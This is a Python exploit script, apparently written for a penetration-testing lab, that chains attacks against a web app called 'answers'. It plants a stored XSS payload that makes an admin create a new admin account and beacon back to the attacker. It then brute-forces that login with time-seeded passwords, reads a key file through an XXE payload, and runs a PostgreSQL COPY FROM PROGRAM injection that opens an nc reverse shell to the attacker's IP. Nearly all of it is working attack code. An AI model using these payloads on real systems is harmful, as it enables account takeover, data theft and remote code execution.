#!/usr/bin/python3

import concurrent.futures
import time
from flask import Flask, request
from datetime import datetime
import os
import pytz
import requests
import threading
from urllib.parse import quote
from flask_cors import CORS
from bs4 import BeautifulSoup


# simple python program to listen for a request, the moment the request is received, read the parameter and do something with it


# ************************
# ****** MODIFY BELOW *****
# ************************

baseUrl = "http://answers:8888"
userName = "john" # XSS payload to create admin user and bruteforce login with
MAX_WORKERS = 50  # threads for bruteforcing

rev_ip = "192.168.45.236"   # reverse shell IP
rev_port = "5555"   # reverse shell port

# **************************
# ****** MODIFY ABOVE  *****
# **************************

proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

passwordFile = "password.txt" #temp file for generation password
session = requests.Session()
app = Flask(__name__)   
CORS(app)






#================ send XSS payload as anonymous ================   
def sendXSSpayload():
    target_url = f"{baseUrl}/question"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # ESCAPE curly brackets with additional brackets
    xss_payload = f"<code><script>fetch(`http://answers:8888/admin/users/create?name=john&email=john@email.com&isAdmin=true&isMod=true`,{{method:`POST`}}).then(r=>{{fetch(`http://{rev_ip}/?d=`+encodeURIComponent(r.headers.get(`Date`)))}})</script></code>"

    data = "title=test123&description=PAYLOAD&category=1".replace('PAYLOAD',quote(xss_payload))

    r = requests.post(url=target_url,data=data,proxies=proxies,headers=headers)

    print("[+] XSS payload sent, waiting for admin to trigger")


# **************************
# ****** START EXPLOIT  *****
# **************************


def start_exploit(date_header):
    #=========== 1. generate token and get date============

    # Parse the date string into a datetime object
    date_object = datetime.strptime(date_header, "%a, %d %b %Y %H:%M:%S %Z")

    utc_timezone = pytz.timezone('UTC')
    date_object_utc = utc_timezone.localize(date_object)

    # Convert the datetime object to epoch time (seconds since January 1, 1970)
    epoch_time = int(date_object_utc.timestamp() * 1000)

    print("Epoch Time from Response          :", epoch_time)



    #========== 2. create token using Java ==============
    print("[+] Compiling java and generating list of password...")
    # compile java
    os.system("javac PasswordGenerator.java")
    os.system(f"java PasswordGenerator {epoch_time}")
    # subprocess.check_output("java encryptToken {} {}".format(userId,timeSeed), shell=True)



    #================= 3. Bruteforce login ======================

    print("[+] Bruteforcing login with passwords")

    with open(passwordFile, "r") as file:
        tokenList = file.readlines()

    tokenList = [s.strip() for s in tokenList]

    # Lock to prevent further processing once a successful login is detected
    success_lock = threading.Lock()


    
    data = "username=USER&password=PASS&submit=Submit".replace("USER",userName)
    headers = {"Content-Type":"application/x-www-form-urlencoded"}

    

    def send_token(s_token):
        
        global login_found
        login_found = False
        
        if login_found:
            return None
        
        matched_token = None  # Initialize outside the lock
        enc_password = quote(s_token) # ONLY URL ENCODE THE PASSWORD
        response = session.post(url=f"{baseUrl}/login", headers=headers, data=data.replace("PASS", enc_password), allow_redirects=True, proxies=proxies)
        
        if f"Welcome {userName}" in response.text:
            with success_lock:                
                matched_token = s_token       
                login_found = True
            return matched_token, login_found
        return None

    # Use multithreading to check tokens concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        results = [executor.submit(send_token, m_token) for m_token in tokenList]


    # Check the responses and print the successful token
    for future in concurrent.futures.as_completed(results):
        result = future.result()
        if result:
            matched_token, login_found = result        
            # print(f"[+] Found Token! Session cookies: {session.cookies}")
            break


    # print(f"cookies: {session.cookies}")
    if 'JSESSIONID' in session.cookies:
        print(f"[+] Login success for '{userName}'")
        print(f"[+] Use the following session cookies... JSESSIONID={session.cookies['JSESSIONID']}")

        # get admin key
        #================ XXE to retrieve adminkey ================

        print("[+] Exploiting XXE to retrieve adminkey")
        adminkey_path = "/home/student/adminkey.txt"
        XXE_PAYLOAD = quote(f'<!DOCTYPE book[<!ENTITY author SYSTEM "file://{adminkey_path}">]><database><categories><category>&author;</category></categories></database>')

        data = f"preview=true&xmldata={XXE_PAYLOAD}"

        header = {"Content-Type": "application/x-www-form-urlencoded"}

        r = session.post(url=f"{baseUrl}/admin/import", data=data, headers=header, proxies=proxies)

        soup = BeautifulSoup(r.text, "html.parser")

        cat_tag = soup.find("category")

        adminkey = cat_tag.get_text().strip()
        print(f"[+] adminkey: {adminkey}")

        #======= SLOWING DOWN ==========
        print("... slowing down the exploit ...")

        # SLOW DOWN !!!
        for i in range(3,0,-1):
            print(f"Countdown: {i} second(s)")
            time.sleep(1)

        #============ RCE ================
        print("[+] Executing reverse shell payload.... Remember to start your nc listener")
        
        REVERSE_SHELL_PAYLOAD = quote(f"DROP TABLE IF EXISTS answers_rce;CREATE TABLE answers_rce(cmd_output text);COPY answers_rce FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {rev_ip} {rev_port} >/tmp/f';SELECT * FROM answers_rce;")
        
        data = f"adminKey={adminkey}&query={REVERSE_SHELL_PAYLOAD}"
        session.post(url=f"{baseUrl}/admin/query", data=data, headers=header, proxies=proxies)
        
        # send payload in 4 different statements
        # DROP TABLE IF EXISTS answers_rce;
        # CREATE TABLE answers_rce(cmd_output text);
        # COPY answers_rce FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {rev_ip} {rev_port} >/tmp/f'
        # SELECT * FROM answers_rce;

        # payload_array = ["DROP TABLE IF EXISTS answers_rce;",
        #                  "CREATE TABLE answers_rce(cmd_output text);",
        #                  f"COPY answers_rce FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {rev_ip} {rev_port} >/tmp/f'",
        #                  "SELECT * FROM answers_rce;"
        #                  ]
        
        # for p in payload_array:
        #     data = f"adminKey={adminkey}&query={quote(p)}"
        #     session.post(url=f"{baseUrl}/admin/query", data=data, headers=header, proxies=proxies)


    else:
        print("[-] Login unsuccessful.")
        


#================ LISTEN FOR XSS CALL BACK from target ================
# looks for GET `d` parameter which contains Date header
@app.route('/', methods=['GET'])
def process_request():
    param_value = request.args.get('d')
    
    if param_value:
        # Do something with the parameter        
        print(f"Received parameter: {param_value}")
        print("[+] starting exploit ")
        start_exploit(param_value)
        return "Success!"
    return ""



if __name__ == '__main__':
    
    sendXSSpayload()
    print("[+] running XSS listener... Now wait for admin to trigger XSS payload...")
    app.run(host='0.0.0.0', port=80)
    
